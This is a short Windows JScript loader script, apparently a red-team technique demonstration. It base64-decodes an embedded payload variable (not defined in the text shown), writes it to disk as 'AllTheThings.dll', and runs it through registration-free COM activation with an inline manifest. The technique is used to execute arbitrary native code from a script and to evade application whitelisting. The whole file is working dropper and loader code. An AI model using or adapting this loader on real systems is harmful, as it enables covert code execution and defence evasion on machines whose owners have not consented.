new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
// You may need to change this path
new ActiveXObject('WScript.Shell').Environment('Process')('TMP') = 'C:\\Users\\research\\Documents';
var manifest = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?> <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"> 	<assemblyIdentity type="win32" name="AllTheThings" version="1.0.0.0"/> 	<file name="AllTheThings.dll">     	<comClass         	description="AllTheThings Class"         	clsid="{89565276-A714-4a43-912E-978B935EDCCC}"         	threadingModel="Both"         	progid="AllTheThings"/> 	</file>  </assembly>';


function Magic(r){if(!/^[a-z0-9+/]+={0,2}$/i.test(r)||r.length%4!=0)throw Error("Not base64 string");for(var t,e,n,o,i,a,f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",h=[],d=0;d<r.length;d+=4)t=(a=f.indexOf(r.charAt(d))<<18|f.indexOf(r.charAt(d+1))<<12|(o=f.indexOf(r.charAt(d+2)))<<6|(i=f.indexOf(r.charAt(d+3))))>>>16&255,e=a>>>8&255,n=255&a,h[d/4]=String.fromCharCode(t,e,n),64==i&&(h[d/4]=String.fromCharCode(t,e)),64==o&&(h[d/4]=String.fromCharCode(t));return r=h.join("")}
function binaryWriter(res,filename) {var base64decoded=Magic(res);var TextStream=new ActiveXObject('ADODB.Stream');TextStream.Type=2;TextStream.charSet='iso-8859-1';TextStream.Open();TextStream.WriteText(base64decoded);var BinaryStream=new ActiveXObject('ADODB.Stream');BinaryStream.Type=1;BinaryStream.Open();TextStream.Position=0;TextStream.CopyTo(BinaryStream);BinaryStream.SaveToFile(filename,2);BinaryStream.Close()}
	
binaryWriter(AllTheThings,"AllTheThings.dll");

var ax = new ActiveXObject("Microsoft.Windows.ActCtx");
ax.ManifestText = manifest;
var DWX = ax.CreateObject("AllTheThings");
	